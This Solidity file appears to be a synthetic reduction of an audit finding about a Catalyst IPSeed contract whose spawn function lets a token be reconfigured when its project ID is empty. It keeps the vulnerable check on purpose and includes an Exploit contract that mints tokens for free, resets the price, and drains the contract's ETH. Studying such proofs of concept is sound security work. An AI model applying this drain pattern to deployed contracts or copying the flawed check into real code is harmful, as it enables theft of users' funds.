// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Catalyst — IPSeed.spawn can reconfigure a tokenId while projectId is empty
    (Pashov, finding 31585).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: TokenAlreadyExists only reverts when projectId is non-empty. The attacker
    spawns with curve parameters 0, mints 10 tokens for 0 ETH, spawns again with a 1 ETH
    sell price, and sells into the 10 ETH already held by IPSeed. Vulnerable line
    preserved verbatim below (@> VULN). */

contract Token {
    string public symbol;
    mapping(address => uint256) public balanceOf;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Curve {
    function getBuyPrice(uint256, uint256 want, bytes32 curveParameters) external pure returns (uint256) {
        return uint256(curveParameters) * want / 1e18;
    }

    function getSellPrice(uint256, uint256 sell, bytes32 curveParameters) external pure returns (uint256) {
        return uint256(curveParameters) * sell / 1e18;
    }
}

contract IPSeed {
    struct Metadata {
        address sourcer;
        address creator;
        string name;
        string symbol;
        string projectId;
        Curve curve;
        bytes32 curveParameters;
    }

    Token public eth;
    mapping(uint256 => Metadata) public tokenMeta;
    mapping(uint256 => mapping(address => uint256)) public balanceOf;
    error InvalidTokenId();
    error TokenAlreadyExists();

    constructor(Token eth_) {
        eth = eth_;
    }

    function computeTokenId(address creator, string memory projectId) public pure returns (uint256) {
        return uint256(keccak256(abi.encode(creator, projectId)));
    }

    function spawn(
        uint256 tokenId,
        string calldata name,
        string calldata symbol,
        string calldata projectId,
        Curve curve,
        bytes32 curveParameters,
        address sourcer
    ) public {
        if (tokenId != computeTokenId(msg.sender, projectId)) {
            revert InvalidTokenId();
        }
        if (bytes(tokenMeta[tokenId].projectId).length > 0) { // @> VULN: an empty projectId never trips TokenAlreadyExists, so tokenId can be spawned again
            revert TokenAlreadyExists();
        }
        // FIX: require(bytes(projectId).length > 0, "empty project");
        Metadata memory newMetadata = Metadata(sourcer, sourcer, name, symbol, projectId, curve, curveParameters);
        tokenMeta[tokenId] = newMetadata;
    }

    function mint(uint256 tokenId, uint256 amount) external payable {
        uint256 price = tokenMeta[tokenId].curve.getBuyPrice(0, amount, tokenMeta[tokenId].curveParameters);
        require(msg.value == price, "price");
        balanceOf[tokenId][msg.sender] += amount;
    }

    function sell(uint256 tokenId, uint256 amount) external {
        balanceOf[tokenId][msg.sender] -= amount;
        uint256 pay = tokenMeta[tokenId].curve.getSellPrice(amount, amount, tokenMeta[tokenId].curveParameters);
        eth.transfer(msg.sender, pay);
    }
}

contract Exploit {
    Token public eth; // nonce 1
    Curve public curve; // nonce 2
    IPSeed public seed; // nonce 3
    uint256 public profit;
    uint256 public minted;

    constructor() {
        eth = new Token("ETH");
        curve = new Curve();
        seed = new IPSeed(eth);
    }

    function run() external {
        uint256 tokenId = seed.computeTokenId(address(this), "");
        seed.spawn(tokenId, "proj", "PRJ", "", curve, bytes32(0), address(this));
        seed.mint(tokenId, 10 ether);
        minted = seed.balanceOf(tokenId, address(this));
        seed.spawn(tokenId, "proj", "PRJ", "", curve, bytes32(uint256(1 ether)), address(this));
        eth.mint(address(seed), 10 ether);
        seed.sell(tokenId, 10 ether);
        uint256 got = eth.balanceOf(address(this));
        eth.transfer(msg.sender, got);
        profit = eth.balanceOf(msg.sender);
        require(minted == 10 ether, "free mint failed");
        require(profit == 10 ether, "eth not drained");
        require(eth.balanceOf(address(seed)) == 0, "seed still holds eth");
    }
}
